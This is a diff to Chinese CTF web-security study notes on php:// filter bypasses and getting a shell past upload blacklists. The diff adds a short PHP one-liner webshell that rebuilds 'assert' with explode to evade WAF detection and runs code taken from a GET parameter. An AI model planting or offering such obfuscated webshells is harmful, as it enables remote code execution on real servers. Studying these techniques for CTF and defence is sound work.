@@ -296,6 +296,17 @@ document.getElementById("levelQuest").onsubmit=checkSubmit;
 
 我们再看一下源码中 存在对 ../ tp data input 的过滤，其实这都是php://协议中的其他方法
 
+## 过狗一句话
+```php
+<?php 
+	$poc="a#s#s#e#r#t"; 
+	$poc_1=explode("#",$poc); 
+	$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 
+	$poc_2($_GET['s']) 
+?>
+```
+explode 函数
+
 ## 求 Getshell
 后缀名黑名单检测和类型检测
 
@@ -303,7 +314,7 @@ document.getElementById("levelQuest").onsubmit=checkSubmit;
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTY0NTc3OTYwNiwxNDAzMjM3MTgxLDE2NT
-U3ODE1Myw0ODQ1Mzk3ODEsLTEyMTkwNTUwMzksLTE3NDUwOTI2
-MjgsLTQyODcyNTgwNF19
+eyJoaXN0b3J5IjpbNDczODY1MTcyLC02NDU3Nzk2MDYsMTQwMz
+IzNzE4MSwxNjU1NzgxNTMsNDg0NTM5NzgxLC0xMjE5MDU1MDM5
+LC0xNzQ1MDkyNjI4LC00Mjg3MjU4MDRdfQ==
 -->
